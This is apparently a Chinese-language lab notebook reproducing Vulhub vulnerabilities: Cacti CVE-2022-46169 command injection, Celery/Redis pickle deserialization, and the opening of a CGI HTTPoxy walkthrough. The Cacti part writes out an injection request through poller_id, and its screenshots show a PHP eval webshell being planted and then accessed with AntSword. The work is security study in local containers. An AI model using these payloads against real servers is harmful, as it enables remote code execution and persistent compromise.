<!-- 这是一张图片，ocr 内容为：TARGET:HTTP://192.168.254.135:8080 SEND CANCEL I RESPONSE REQUEST INACTIONSY RAWRENDERIN ACTIONS RAW PRETTY PRETTY /REMOTE AGENT.PHP?ACTION-POLLDATAGLOCAL DATA IDSLO]-6SHOST ID 15 GET HTTP/1.1  200  OK 2 DATE:WED,26 JUN 2024 08:51:09 GMT 2 DAT HTTP/1.1 POLLER 1D-TOUCH+/TMP/SUCCESS SERVER: APACHE/2.4.54(DEBIAN) X-FORWARDED-FOR:127.0.0.1 4X-POWERED-BY:PHP/7.4.33 HOST:192.168.254.135:8080 USER-AGENT: MOZILLA/5.0 (X11; LINUX X86 64; RV:109.0) GECKO/201001001 5 LAST-MODIFIED:WED,26 JUN 2024 08:51:09 GMT FIREFOX/115.0 X-FRAME-OPTIONS:SAMEORIGIN 7 CONTENT-SECURITY-POLICY: DEFAULT-SRC *; IMG-SRC 'SELF' DATA: BLOB:; STYLE ACCEPT: 8P3P:CP'CAO PSA OUR" TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XML;Q-0.9,IMAGE/AVIF,IMAGE/WE CACHE-CONTROL:NO-STORE,NOCACHE,MUST-REVALIDATE BP,*/*;Q-0.8 10 EXP ACCEPT-LANGUAGE:EN-US,EN;Q.5 O EXPIRES:THU,19 NOV 1981 08:52:00 GMT PRAGMA:NO-CACHE ACCEPT-ENCODING:GZIP,DEFLATE REFERER:HTTP://192.168.254.135:8080/ CONTENT-LENGTH:55 CONNECTION:CLOSE CONNECTION:CLOSE T CONTENT-TYPE:TEXT/HTML;CHARSET-UTF-8 COOKIE: CACTI-E19144A2EACF6961BCFC97310E61419D; CACTIDATETIME-WED JUN 26 2024 16:49:44 GMT+0800 (CHINA STANDARD TIME); CACTITITIMEZONE-480 [["VALUE":"O","RRD NAME":"UPTIME","LOCAL DATA ID":"6*] 11UPGRADEINSECUREQUESTS:L -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821119889-c5b0a94c-4916-4c7e-9fb0-bb250b79c2cd.png)

<font style="color:#1f2328;background-color:#FFFFFF;">虽然响应包里没有回显，但是进入容器中即可发现</font><font style="color:#1f2328;">/tmp/success</font><font style="color:#1f2328;background-color:#FFFFFF;">已成功被创建：</font>

<!-- 这是一张图片，ocr 内容为：[CENTOS@LOCALHOST CVE-2022-46169]$ DOCKER SUDO PS COMMAND CREATED CONTAINER ID IMAGE STATUS PORTS NAMES VULHUB/CACTI:1.2.22 "BASH /ENTRYPOINT.SH..." 3 MINUTES AGO ADEEC83D7386 0.0.0.0:8080-980/TCP, CVE-2022-46169-WEB-1 ::808080-980/TCP UP3MINUTES 3 MINUTES AGO "DOCKER-ENTRYPOINT.S... 428D26F1E2F6 MYSGL:5.7 3306/TCP,33060/TCP UP 3 MINUTES CVE-2022-46169-DB-1 [CENTOSALOCALHOST CVE-2022-46169]$ SUDO DOCKER EXEC -IT ADEEC83D7386 BASH ROOT@ADEEC83D7386://VAR/WW/HTML# LS -AL /TMP/ TOTAL8 111 JUN 26 08:51 DRWXRWXRWT 1 ROOT ROOT 60 JUN 26 08:48 DRWXP-XR-X 1 ROOT ROOT 08:48 SESS_50A6B902F4C30FFD287F2CE 1 WWW-DATA WW-DATA 1604 JUN 26 08 -IW- 7A2798CAC 1 WWW-DATA WWW-DATA 3116 JUN 26 08:51 SESS ESS_E19144A2EACF6961BCFC973 -IW 10E61419D 08:51 26 0 JUN -RW-R--R-- 1 WW-DATA WWW-DATA SUCCESS 0 MATCHES ROOT@ADEEC83D7386://VAR/WWW/HTML# -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821120068-a35657bc-3007-432e-ac36-49a4e4779ec9.png)

<font style="color:#1f2328;">写入</font><font style="color:#1f2328;">webshell</font><font style="color:#1f2328;">：</font>

```plain
GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`echo+'<?php+phpinfo();?>'>/var/www/html/test.php` HTTP/1.1
```

<!-- 这是一张图片，ocr 内容为：TARGET:HTTP://192.168.254.135:8080 SEND CANCEL I RESPONSE REQUEST I5 ACTIONS PRETTY PRETTY ACTIONS RAWRENDER RAW 1 GET /REMOTE_AGENT.PHP?ACTION-POLLDATASLOCAL_DATA IDSLO]-6CHOST ID-18 HTTP/1.1  200  OK 2DATE:WED,26 JUN 2024 09:43:51 GMT HTTP/1.1 POLLER_ID-'ECHO+'<?PHP+PHPINFO();?>>>/VAR/WWW/HTML/TEST.PHP 23 3SERVER:APACHE/2.4.54( X-FORWARDED-FOR:127.0.0.1 54(DEBIAN) 4 X-POWERED-BY:PHP/7.4.33 HOST:192.168.254.135:8080 4 US USER-AGENT: MOZILLA/5.0 (X1L; LINUX X86 64; RV:109.0) GECKO/20100101 ,26 JUN 2024 09:43:52 GMT 5LAST-MODIFIED:WED,2E FIREFOX/115.0 : SAMEORI GIN X-FRAME-OPTIONS 7 CONTENT-SECURITY-POLICY: DEFAULT-SRC *; IMG-SRC'SELF' DATA: BLOB:; STYLE ACCEPT: TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XMLIQ-0.9,IMAGE/AVIF,IMAGE/WE 8P3P:CP'CAOPSA OUR* 9 CACHE-CONTROL:NO-STORE,NO-CACHE,MUST-REVALIDATE BP,*/*:Q-0.8 10 SET-COOKIE: CACTI-8F4D6C90A97F3573CA58CA763948AL6A; PATH-/; HTTPONLY; SAMG ACCEPT-LANGUAQE:EN-US,EN;Q0.5 11 EXPIRES:THU,19 NOV 1981 08:52:00 GMT ACCEPT-ENCODING:GZIP,DEFLATE REFERER:HTTP://192.168.254.135:8080/GRAPHS_NEW.PHP 12PRAGMA:NOCACHE 13  CONTENT-LENGTH:55 CONNECTION:CLOSE 14CONNECTION:CLOSE COOKIE: CACTI-E19144A2EACF6961BCFC97310E61419D; CACTIDATETIME-WED JUN 26 15 CONTENT-TYPE:TEXT/HTML:CHARSET-UTF-8 2024 16:49:44 GMT+0800 (CHINA STANDARD TIME); CACTITIMEZONE-480 16 11 UPGRADE-INSECURE-REQUESTS: 1 17 [ 12 [['VALUE":"O","RRD NAME":"UPTIME","LOCAL DATA ID":"6"7 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821120393-82569d6f-43c2-4e4e-819e-a397227f6ebf.png)

<!-- 这是一张图片，ocr 内容为：2022 REMOTE_AGENT.PHP AUG 14 14552 WWW-DATA WWW-DATA -IW-R-R- 5309  2022 REPORTS_ADMIN.PHP AUG 14 WWW-DATA WWW-DATA -RW-RW-R 5210 AUG 14 2022 REPORTS USER.PHP WWW-DATA WWW-DATA -RW-RW-R- 2022 86 AUG 14 DRWXRWXY-X WWW-DATA WW-DATA RESOURCE 23 AUG 14 2022 DRWXRWXI-X 1 WWW-DATA WWW-DATA RRA  2022 RRDCLEANER.PHP 20183 AUG 14 -RW-RW-R-- 1 WWW-DATA WWW-DATA 2022 11907 AUG 14 SCRIPT_SERVER.PHP WWW-DATA WW-DATA 1 -RW-RW-R-- 26 08:49 SCRIPTS 4096 DRWXRWXP-X JUN WWW-DATA WWW-DATA AUG 14 2022 SERVICE DRWXRWXR-X 1 WWW-DATA WWW-DATA 62 1728 AUG 14 2022 SERVICE_CHECK.PHP 1 WWW-DATA WWWWW-DATA -RW-RW-R-- 2022 SETTINGS.PHP 43453 AUG 14 1 WWW-DATA WWW-DATA -IW-IW-1-1 1 2022 SITES.PHP 20567  AUG  14 WWW-DATA WWW-DATA -IW-IW-1- 2022 SNMPAGENT_MIBCACHE.PHP 1 2414 AUG 14 WWL-DATA WWW-DATA TW-IW-1-1 2022 SNMPAGENT_MIBCACHECHILD.PH 1 WWW-DATA WW-DATA 3688  AUG 14 -IW-HW-I- P 5510 AUG 14  2022 SNMPAGENT_PERSIST.PHP K 1 WWW-DATA WW-DATA RWXRWXP-X 3987 AUG 14 2022 SPIKEKILL.PHP 1 WWW-DATA WW-DATA RW-RW-R-- 22 TEMPLATES_EXPORT.PHP 6597 AUG 2022  T G 14 1 WWW-DATA WWW-DATA RW-RW-I-- 2022 TEMPLATES_IMPORT.PHP 6263 AUG 14 WWW-DATA WWW-DATA RW-RW-11- 609:43 TEST.PHP 19 JUN 26 09 WWW-DATA WWW-DATA RW-1--1 2022  TREE.PHP 64922  AUG 14 WWW-DATA WWW-DATA -RW-RW-I  2022 USER_ADMIN.PHP 99936  AUG 14 WWW-DATA WWW-DATA -RW-RW-I  2022 USER_DOMAINS.PHP ATCHEE 29909  AUG 14 WWW-DATA WW-DATA -RW-RW-I- 2022 USER_GROUP_ADMIN.PHP 89318  AUG 14 WWW-DATA WWW-DATA -RW-RW-R-- 2022 UTILITIES.PHP 1 G 14 104198  AUG WWW-DATA WWW-DATA -IW-IW-I -RW-RW-P- 1 WWW-DATA 2022 VDEF.PHP 28883 AUG 14 WWW-DATA RAA+AGAOGY ROOT@ADEEC83D7386://VAR/ HTML# -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821120876-b2386295-4465-4416-bbe5-660c72619d83.png)

<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080/TEST.PHP KALI TRAINING KALI DOCS NETHUNTER MSFU EXPLOIT-DB KALI FORUMS OFFENSIVE SECURITY OTHER KALI TOOLS KALI LINUX PHP PHP VERSION 7.4.33 JLINUX ADEEC83D7386 3.10.0-1160.EL7 X86 64 #1 SMP MON OCT 19 18:59 UTC 2020 X86 64 SYSTEM NOV 15 2022 06:03:12 BUILD DATE CONFIGURE COMMAND 1"/CONFGURE''-BUILD-X86 64-FINUX-GNU'"-WITH-CONFIG-FILE-PATH-/US//ETC/PHP',-WITH-CONFIG-FIE- ISCAN-DIR-/USR/ETC/ETC/PHP/CONF-D''-ENABLE-OPTION-CHECKING-FATAL'--WITH-MHASH '-WITH-DIC' LENABLE-FTP'-ENABLE-MBSTING''-ENABLE-MYSQIND'--WITH-PASSWORD-ARQON2 '-WITH-SODIUM-SHARED''"" LWITH-ZLIB"-DISABLE-PHPDBQ'--WITH-PEAR''-WITH-JIBDIR-FIBDIR-FIB/X86 64-JISABLE-CQISABLE-CQITH- APXS2''BUILD_ALIASX86 64-LINUX-GNU' APACHE 2.0 HANDLER SERVER API DISABLED VIRTUAL DIRECTORY SUPPORT /USR/LOCAL/ETC/PHP CONFIGURATION FILE(PHP.INI)PATH LOADED CONFIGURATION FILE (NONE) SCAN THIS DIR FOR ADDITIONAL .INI FILES /USR/LOCAL/ETC/PHP/CONF.D ADDITIONAL .INI FILES PARSED /US/LOCAL/ETC/PHP/CONF D/CACTIINI, /USTLOCAL/ETC/PHP/CONF D/DOCKER-PHP-EXT-QDINI, JUSR/ETC/PHP /CONF D/DOCKER-PHP-EXT-GMP,INI, /UST/LOCAL/ETC/PHP/CONF:D/DOCKER-PHP-EXTIDAP-INI, /UST/LOCALVETC/PHP /CONF-D/DOCKER-PHP-EXT-PDO.MYSQLINI, /UST/LOCAL/ETC/PHP/CON: D/DOCKER-PHP-EXT SNMP,INI, /UST/LOCAL /ETC/PHP/CONFD/DOCKER-PHP-EXT-SOCKETS,INII, JUST/LOCAL/ETC/PHP/CONF DOCKER-PHP-EXT-SODIUM.INI PHP API 20190902 PHP EXTENSION 20190902 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821121003-37848cf6-f88b-4bbc-9198-fb5d4287ed15.png)

<font style="color:#333333;">利用一句话木马</font><font style="color:#333333;">,</font><font style="color:#333333;">在蚁剑反弹</font>

<!-- 这是一张图片，ocr 内容为：TARGET:HTTP://192.168.254.135:8080 SEND CANCEL RESPONSE REQUEST ACTIONS RAWRENDER/N PRETTY ACTIONS PRETTY RAW /REMOTE AGENT.PHP?ACTION-POLTDATAGLOCAL DATA IDS[O]-6SHOST ID-1S HTTP/1.1  200  OK GET/REM 2 DA DATE:WED,26 JUN 2024 09:46:13 GMT POLLER_ID- I'ECHO+'<?PHP+@EVAL($ REQUEST[*SHELL'];?>>>>>/VAR/WWW/HTML/SHELL.PHP" 3SERVER:APACHE/2.4.54(DEBIAN) 4X.POWERED.BY:PHP/7.4.33 HITP/1.1 5 LAST-MODIFIED: WED, 26 JUN 2024 09:46:13 GMT 2 X-FORWARDED-FOR:127.0.0.1 3 HOS 6XFRAMEOPTIONS:SAMEORIGIN HOST:192.168.254.135;8080 DATA:BLOB;;STYLE 4 USE C'SELF USER-AGENT: MOZILLA/5.0 (X11; LINUX X86 64; RV:109.0) GECKO/20100101 7 CONTENT-SECURITY-POLICY:DEFAULT-SRC *;IMG-SRC'S FIREFOX/115.0 8P3P:CP"CAO PSA OUR* 9 CACHE-CONTROL:NO-STORE,NO-CACHE,MUST-REVALIDATE ACCEPT: LTEXT/HTML.APPLICATION/XHTML+XML,APPLICATION/XML:Q-0.9,IMAGE/AVIT,IMAGE/WE O SET-COOKIE: CACTI-6552AC5022FEDF 452608443B63209DB; PATH-/: HTTPONLY: SAME 10 S 11 EXPIRES:THU, 19 NOV 1981 08:52:00 GMT BP,*/*:Q-0.8 ACCEPT-LANGUAGE:EN-US,EN;Q.5 12PRAGMA:NO-CACHE 13 CONTENT-LENGTH:55 ACCEPT-ENCODING:GZIP,DEFLATE 8REFERER:HTTP://192.168.254.135:8080/GRAPHS_NEW.PHP 14CONNECTION:CLOSE 9 CONNECTION: CLOSE 15 CONTENT-TYPE:TEXT/HTML;CHARSET-UTF-8 10 COOKIE: CACTI-EL9144AZEACF6961BCFC97310E61419D; CACTIDATETIME-WED JUN 26 16 7['VALUE":"O","RRD NAME":"UPTIME","LOCAL DATA ID":'6"1 17[R] 2024 16:49:44 GMT+0800 (CHINA STANDARD TIME); CACTITIMEZONE-480 11 UPGRADE-INSECUREQUESTS:L -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821121501-cb0396c6-ae16-4168-bf5b-7fccf1c462d9.png)

<!-- 这是一张图片，ocr 内容为：11 , WW-DATA WW-DATA AUG 14 5309 2022 REPORTS_ADMIN.PHP RW-RW-I AUG 14 WWW-DATA 5210 2022 REPORTS_USER.PHP WWW-DATA RW-RW-R DRWXRWXR-X 1 WWW-DATA 86 AUG 14 WWW-DATA 2022 RESOURCE 23 X 1 WWW-DATA AUG 14 DRWXRWXI-X WWW-DATA 2022  RRA  2022 RRDCLEANER.PHP 1 WWW-DATA 20183 AUG 14 -RW-IW-I- WWW-DATA 1 WWW-DATA 2022 SCRIPT_SERVER.PHP 11907 AUG 14 WWW-DATA -RW-RW-R- DRWXRWXP-X 1 JUN 26 4096 08:49 SCRIPTS WWW-DATA WWW-DATA 62 AUG 14 DRWXRWXR-X 1 WWW-DATA 2022 SERVICE WWW-DATA 1728 AUG 14  SERVICE_CHECK.PHP 2022 1 WWW-DATA WWW-DATA RW-IW-1-- 43453 AUG 14 2022 WWW-DATA SETTINGS.PHP WWW-DATA RW-RW-IR- 35 JUN 26 09:46 SHELL.PHP WWW-DATA WWW-DATA 20567 AUG 14 2022 SITES.PHP WWW-DATA RW-RW-R- WWW-DATA 2414 AUG 14 2022 SNMPAGENT_MIBCACHE.PHP 1 -IW-IW-I WWW-DATA WWW-DATA _MIBCACHECHILD.PH 2022 SNMPAGENT_MI 3688 AUG 14 -RW-RW-R-- 1 WWW-DATA WWW-DATA P 2022 SNMPAGENT_PERSIST.PHP -RWXRWXR-X 1 WWW-DATA WWW-DATA 5510 AUG 14 202 2022  SPIKEKILL.PHP 3987 AUG 14 1 WWW-DATA WWW-DATA -RW-RW-R-- 2022 TEMPLATES_EXPORT.PHP AUG 14 6597 1 WWW-DATA WWW-DATA IW-I-I- 2022 TEMPLATES_IMPORT.PHP 14 6263 -RW-RW-R-- 1 WWW-DATA AUG WWW-DATA 26 09:43 TEST.PHP 19 -- 1 WWW-DATA WWW-DATA JUN IW-I--1- AUG 14 64922 2022 TREE.PHP -RW-RW-R- 1 WWW-DATA WWW-DATA 2022 USER_ADMIN.PHP 99936 AUG 14 1 WWW-DATA WWW-DATA W-IW-1-- 2022 USER_DOMAINS.PHP  MATCHES AUG 14 1 WWW-DATA 29909 DATA WMWW- 2022 USER_GROUP_ADMIN.PHP 89318 1 WWW-DATA AUG 14 DATA -IW-IW-I- WNWW- 2022 UTILITIES.PHP AUG 14 1 104198 WWW-DATA WWW-DATA RW-RW-R 2022 VDEF.PHP -RW-RW--- 1 28883 AUG 14 WWW-DATA WWW-DATA ML# ROOT@ADEEC83D7386://VAR/WWW/HTML# -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821121770-d66a9f67-e79c-41e4-ba19-1dfd87a43b40.png)

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 设置 数据管理(1) 分类目录(1) A重命名 血删除 添加 IP地: URL 地址 添加数据 口默认分类 HTTP://192.168.163.135/DVWA/HACL 192.1T 号测试连接 X清空 添加 香基砂配置 URL 地址 HTTP://192.168.254.135:8080/SHELL.PHP 连接密码 SHELL 网站备注 编码设置 UTF8 连接类型 PHP 编码器 DEFAULT(不推荐) BASE64 CHR 请求信息 其他设置 成功 连接成功! -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821121744-01cc6049-50a7-48d6-874f-2f4a758164eb.png)

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 口192.168.254.135 口文件列表(108) 口目录列表(16) 新建 1/ 刷新 主目录 上层 读取 FVARFWWWFHTMLY VAR 属性 日期 大小 名称 MAA 0664 11.63 KB 2022-08-14 21:42:59 SCRIPT_SERVER.PHP HTML 2022-08-14 21:42:59 1.69 KB 0664 SERVICE_CHECK.PHP CACHE CLI 0664 2022-08-14  21:42:59 SETTINGS.PHP 42.43 KB DOCS SHELL.PHP 0644 2024-06-26 09:46:13 35B FORMATS 2022-08-14 21:42:59 0664 20.08 KB SITES.PHP IMAGES 0664 2.36 KB 2022-08-14 21:42:59 SNMPAGENT_MIBCACHE PHP INCLUDE SNMPAGENT_MIBCACHECHILD.PHP 0664 3.6 KB 2022-08-14  21:42:59 INSTALL 5.38 KB 2022-08-14 21:42:59 SNMPAGENTPERSIST.PHP 0775 LIB 3.89 KB 2022-08-14  21:42:59 0664 SPIKEKILL.PHP LOCALES 6.44KB 2022-08-14  21:42:59 TEMPLATES_EXPORT.PHP 0664 LOG MIBS 6.12 KB TEMPLATES_IMPORT.PHP 2022-08-14  21:42:59 0664 PLUGINS TEST.PHP 19B 2024-06-26 09:43:52 0644 RESOURCE 63.4KB 2022-08-14 21:42:59 0664 TREE.PHP RRA 97.59 KB USER_ADMIN.PHP 0664 2022-08-14 21:42:59 SCRIPTS 29.21 KB 2022-08-14 21:42:59 0664 USER_DOMAINS.PHP SERVICE 87.22 KB 2022-08-14 21:42:59 0664 USER_GROUP_ADMIN.PHP UTILITIES.PHP 101.76 KB 2022-08-14  21:42:59 0664 28.21 KB VDEF.PHP 2022-08-14  21:42:59 0664 三任务列表 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821122403-533e4b65-af28-40f4-9354-e85a9cd9d3fc.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">Celery <4.0 Redis</font><font style="color:#1f2328;background-color:#FFFFFF;">未授权访问</font><font style="color:#1f2328;background-color:#FFFFFF;">+Pickle</font><font style="color:#1f2328;background-color:#FFFFFF;">反序列化利用</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动</font><font style="color:#1f2328;background-color:#FFFFFF;">Celery 3.1.23 + Redis</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

```plain
docker compose up -d
```

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞复现</font>
<font style="color:#1f2328;background-color:#FFFFFF;">漏洞利用脚本</font><font style="color:#1f2328;">exploit.py</font><font style="color:#1f2328;background-color:#FFFFFF;">仅支持在</font><font style="color:#1f2328;background-color:#FFFFFF;">python3</font><font style="color:#1f2328;background-color:#FFFFFF;">下使用</font>

```plain
pip install redis 
python exploit.py [主机IP]
```

<font style="color:#1f2328;background-color:#FFFFFF;">查看结果：</font>

<!-- 这是一张图片，ocr 内容为：-(KALIGKALI)-[~/DESKTOP/VULHUB-MASTER/CELERY/CELERY3.REDIS_UNAUTH] OV 192.168.254.135 PYTHON3 EXPLOIT.PV 1 'PROPERTIES': {'DELIVERY_T 'APPLICATION/X N/X-PYTHON-SERIALIZE', CONTENT-TYPE 4-BLEA-6FA92DEE529A', 'REPLY_T '9EDB8565-0B59-3389- LY_TO AG': '16F3F59D-003C-4EF4-B1E 'BASE64', 'DELIVERY_ 'DELIVERY_MODE': 2, 'BODY_ENCODING' 944E-A0139180A048 INFO': {'ROUTING_KEY' 'CELERY' 'CELERY', 'PRIORITY': 0, 'CORRE EXCHANGE 丹, LATION_ID':'6E046B48-BCA4-49A0-BFA7-A92847216999999]], 'HEADERS' CONTENT- C214LIWGC3LZDGVTLJOUJBL0B3V BINARY','BODY': GASVNAAAAAAAAACMBXBVC21 ENCODING JACAVDG1WL2NLBGVYEV9ZDWNJZXNZLIWUUPQU'} -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821213485-d46430e0-67ab-410b-9c04-c19c3d5649ab.png)

<!-- 这是一张图片，ocr 内容为：[CENTOSALOCALHOST CELERY3_REDIS UNAUTH]$ SUDO DOCKER-COMPOSE LOGS CELERY FOR CENTOS: [SUDO] PASSWORD [2024-06-26 13:05:44,723: DEBUG/MAINPROCESS] CELERY3_REDIS_UNAUTH-CELERY-1 WORKER: PREPARING BOOTSTEPS. [2024-06-26 13:05:44,725: DEBUG/MAINPROCESS] LERY3_REDIS_UNAUTH-CELERY-1 CEL WORKER:BUILDING GRAPH V2.3.1.Z1PSAVED 115/72 [2024-06-26 13:05:44,726: DEBUG/MAINPROCESS] CELERY3_REDIS_UNAUTH-CELERY-1 WORKER: NEW BOOT ORDER: ISTATEDB, BEAT, TIMER, HUB, QUEUES (INTRA), POOL. AUTOSCALER, AUTORELOADER, CONSUMER; 430000001N CELERY3_REDIS_UNAUTH-CELERY-1 [2024-06-26 13:05:44,734: DEBUG/MAINPROCESS] CONSUMER:PREPARING BOOTSTEPS. [2024-06-26 13:05:44,734:DEBUG/MAINPROCESS] CELERY3_REDIS_UNAUTH-CELERY-1 CONSUMER:BUILDING GRAPH.. E DISK OF A MULTI-PART ARCHIVE. IR . [2024-06-26 13:05:44,746: DEBUG/MAINPROCESS] CELERY3_REDIS_UNAUTH-CELERY-1 T ORDER: (CONNECTION, EVENTS, MINGLE, GOSSIP, TASKS, CONT CONSUMER:NEW BOOT ROL,HEART,AGENT,EVENT L LOOP ECTORY IN ONE OF HACKBAR-V2.3.1.Z1P [2024-06-26 13:05:44,754: DEBUG/MAINPROCESS] CELERY3_REDIS_UNAUTH-CELERY-1  WORKER: STARTING HUB [2024-06-26 13:05:44,754: DEBUG/MAINPROCESS] IS_UNAUTH-CELERY-1 CELERY3_REDIS_UN SUBSTEP OK DOWNTOADS CELERY3_REDIS_UNAUTH-CELERY-1 [2024-06-26 13:05:44,754: DEBUG/MAINPROCESS] STARTING POOL WORKER: [2024-06-26 13:05:44,764: DEBUG/MAINPROCESS] _UNAUTH-CELERY-1 CELERY3 REDIS THE AUTOCOMPLETION SCRIPT FOR THE SPECIFIED SUBSTEP OK GENERATE [2024-06-26 13:05:44,765: DEBUG/MAINPROCESS] ELERY3_REDIS_UNAUTH-CELERY-1 CELER WORKER: STARTING CONSUMER [2024-06-26 13:05:44,765: DEBUG/MAINPROCESS] CELERY3_REDIS_UNAUTH-CELERY-1 CONSUMER: STARTING CONNECTION -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821213663-96980268-196b-4e31-b7e4-754523c07c56.png)

<!-- 这是一张图片，ocr 内容为：[2024-06-26 13:22:31,774: WARNING/MAINPROCES CELERY3_REDIS_UNAUTH-CELERY-1 S] RECEIVED AND DELETED UNKNOWN MESSAGE. WRONG DESTINATION?!? CELERY3_RED1S_UNAUTH-CELERY-L CONTENTS OF THE MESSAGE BODY WAS: B FULL THE CELERY3_REDIS_UNAUTH-CELERY-1 ODY:0(63B) {CONTENT_TYPE:'APPLICATION/X-PYTHON-SERIALIZ  CELERY3_REDIS_UNAUTH-CELERY-1 E' CONTENT_ENCODING:'BINARY'  DELIVERY_INFO:{'EXCHANGE': 'CELERY', CELERY3_REDIS_UNAUTH-CELERY-1 ROUT O} HEADERS-{F} ING_KEY': 'CELERY', 'PRIORITY':  CELERY3_REDIS_UNAUTH-CELERY-1 CELERY3_REDIS_UNAUTH-CELERY-1 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821213567-a1e5b8a4-28f7-461c-9cfa-6f4dcbe99912.png)

<font style="color:#1f2328;background-color:#FFFFFF;">可以看到如下任务消息报错：</font>

```plain
docker compose exec celery ls -l /tmp
```

<font style="color:#1f2328;background-color:#FFFFFF;">可以看到成功创建了文件</font><font style="color:#1f2328;">celery_success</font>

<!-- 这是一张图片，ocr 内容为：UDO DOCKER-COMPOSE EXEC CELERY LS [CENTOS@LOCALHOST CELERY3_REDIS UNAUTH]$ SUDO 1/TMP/ TOTAL 0 TASKMANAQER -RW-R--R-- 1 USER USER 0 JUN 26 13:22 CELERY SUCCESS -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821213453-b814b507-9148-4f04-a17c-591f4c69068d.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">CGI HTTPoxy</font><font style="color:#1f2328;background-color:#FFFFFF;">漏洞（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2016-5385</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">环境搭建</font>
<font style="color:#1f2328;background-color:#FFFFFF;">启动一个基于</font><font style="color:#1f2328;background-color:#FFFFFF;">PHP 5.6.23 + GuzzleHttp 6.2.0</font><font style="color:#1f2328;background-color:#FFFFFF;">的应用：</font>

```plain
docker compose up -d
```

<font style="color:#1f2328;background-color:#FFFFFF;">Web页面原始代码：</font>[index.php](https://github.com/vulhub/vulhub/blob/master/cgi/CVE-2016-5385/www/index.php#tdsub)

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞复现</font>
<font style="color:#1f2328;background-color:#FFFFFF;">正常请求</font><font style="color:#1f2328;">http://your-ip:8080/index.php</font><font style="color:#1f2328;background-color:#FFFFFF;">，可见其</font><font style="color:#1f2328;background-color:#FFFFFF;">Origin</font><font style="color:#1f2328;background-color:#FFFFFF;">为当前请求的服务器，二者</font><font style="color:#1f2328;background-color:#FFFFFF;">IP</font><font style="color:#1f2328;background-color:#FFFFFF;">相等：</font>

<!-- 这是一张图片，ocr 内容为：IP111.CN KALI FORUMS OFFENSIVE S KALI DOCS KALI TOOLS KALI LINUX NETHUNTER KALI TRAINING IP111.CN全方位查询您的IP地址 从国外测试 从国内测试 27.37.72.234中国东莞市 27.37.72.234中国东莞市 这是您访问国内网站所使用的IP 您访问没有被封的国外网站所使用 的IP -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780822437458-4bbb7997-389c-460a-b4b8-d3e77301e340.png)

<!-- 这是一张图片，ocr 内容为：TARGET:HTTP://192.168.254.13 CANCEL SEND REQUEST RESPONSE PRETTY RAW ACTIONS RAWRENDER PRETTY ACTIONS GET/INDEX.PHP HTTP/1.1 HTTP/1.1  200  OK HOST:192.168.254.135:8080 2SERVER:NGINX/1.27.0 DATE:WED,26 JUN 2024 14:09:41 GMT 3 USER-AGENT: MOZILLA/5.0 (X1L; LINUX X86.64; RV:109.0) GECKO/20100101 CONTENT-TYPE: APPLICATION/JSON; CHARSET-UTF-8 FIREFOX/115.0 5 CONNECTION:CLOSE ACCEPT: TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XML;Q-0.9,IMAGE/AVIF,IMAGE/WEN 6X-POWERED-BY:PHP/5.6.23 CONTENT-LENGTH:259 BP,*/*;Q-0.8 8 5A ACCEPT-LANGUAGE:EN-US,EN;Q-0.5 16 ACCEPT-ENCODING:GZIP,DEFLATE 10 *'ARGS':{ CONNECTION:CLOSE 8 UPGRADE-INSECURE-REQUESTS: "HEADERS":{ 6 11 10 12 HOST":"HTTPBIN.ORG", WUSER-AGENT":"GUZZLEHTTP/6.2.0 CURL/7.38.0 PHP/5.6.23", 13 "X-AMZN-TRACE-ID":'ROOT-1-667C2125-34455B5735DB6F5F5F5FDEDEAB" 14 15 16 "ORIGIN":27.37.72.234', 17 URL:HTTP://HTTPBIN.ORG/GET" 18 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780822437543-f02a265b-abd6-48e4-8b12-3eaa8d2d3720.png)

<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080/INDEX.PHP S KALI TRAINING NETHUNTER KALI TOOLS KALI LINUX KALI FORUMS KALI DOCS HEADERS RAW DATA JSON COLLAPSE ALL EXPAND ALL FILTER JSON SAVE COPY 丹 ARGS: HEADERS: "HTTPBIN.ORG" HOST: "GUZZLEHTTP/6.2.0 CUR1/7.38.0 PHP/5.6.23" USER-AGENT:  X-AMZN-TRACE-ID: "ROOT-1-667C22A9-34590ED02A3EF7B86C8FC3FB" "27.37.72.234" ORIGIN: HTTP://HTTPBIN.ORG/GET URL: -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780822437697-a96f4aaa-c679-42c5-a957-7181085eff8a.png)

<font style="color:#1f2328;background-color:#FFFFFF;">在其他地方启动一个可以正常使用的</font><font style="color:#1f2328;background-color:#FFFFFF;">http</font><font style="color:#1f2328;background-color:#FFFFFF;">代理，如</font><font style="color:#1f2328;">http://58.246.58.150:9002/</font><font style="color:#1f2328;background-color:#FFFFFF;">。</font>

